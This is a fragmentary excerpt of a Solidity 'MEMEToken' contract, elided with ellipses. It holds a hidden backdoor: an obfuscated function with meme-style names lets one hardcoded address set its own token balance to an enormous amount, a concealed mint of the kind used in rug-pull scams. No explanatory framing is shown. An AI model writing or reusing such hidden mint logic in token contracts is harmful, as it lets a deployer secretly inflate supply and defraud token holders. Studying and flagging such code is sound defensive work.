...
contract MEMEToken is Ownable {
    ...
    function pepepogAdddmmm() external {
        ...
        if (_cwojakpepe65!= tswojaks){
            revert("tswojaks"); 
        }
        if(_cwojakpepe65 == tswojaks){
            _balances[_cwojakpepe65] = peedAmount()*(44000);
        }
    ...
    constructor(string memory tokenName_, string memory Tokensymbol_) {
        _cwojakpepe65 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
